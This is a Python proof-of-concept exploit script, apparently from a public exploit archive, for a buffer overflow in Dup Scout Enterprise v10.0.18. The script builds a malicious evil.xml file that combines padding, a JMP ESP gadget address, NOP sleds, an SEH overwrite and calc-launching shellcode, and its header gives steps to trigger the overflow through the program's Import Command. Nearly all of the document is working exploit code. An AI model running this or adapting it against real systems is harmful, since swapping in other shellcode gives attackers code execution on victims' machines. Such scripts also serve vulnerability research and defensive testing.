#!/usr/bin/python

#========================================================================================================================
# Exploit Author: Touhid M.Shaikh
# Exploit Title: Dup Scout Enterprise v10.0.18 "Import Command" Buffer
Overflow
# Date: 29-09-2017
# Website: www.touhidshaikh.com
# Contact: https://github.com/touhidshaikh
# Vulnerable Software: Dup Scout Enterprise v10.0.18
# Vendor Homepage: http://www.dupscout.com
# Version: v10.0.18
# Software Link:
http://www.dupscout.com/setups/dupscoutent_setup_v10.0.18.exe
# Tested On: Windows 7 x86
#
#
# To reproduce the exploit:
#   1. right Click, click on Import Command
#   2. select evil.xml , Booom Calc POPED up.. ;)
#========================================================================================================================


import os,struct

#offset to eip
junk = "A" * (1560)

#JMP ESP (QtGui4.dll)
jmp1 = struct.pack('<L',0x651bb77a)

#NOPS
nops = "\x90"

#LEA   EAX, [ESP+76]
esp = "\x8D\x44\x24\x4c"

#JMP ESP
jmp2 = "\xFF\xE0"

#Jump short 5
nseh = "\x90\x90\xEB\x05"

#POP POP RET
seh = struct.pack('<L',0x6501DE41)

#CALC.EXE pop shellcode
shellcode =
"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"


# FINAL PAYLOAD
buf = junk + jmp1 + nops * 16 + esp + jmp2 + nops * 90 + nseh + seh + nops
* 10 + shellcode


#FILE
file='<?xml version="1.0" encoding="UTF-8"?>\n<classify\nname=\'' + buf +
'\n</classify>'


f = open('evil.xml', 'w')
f.write(file)
f.close()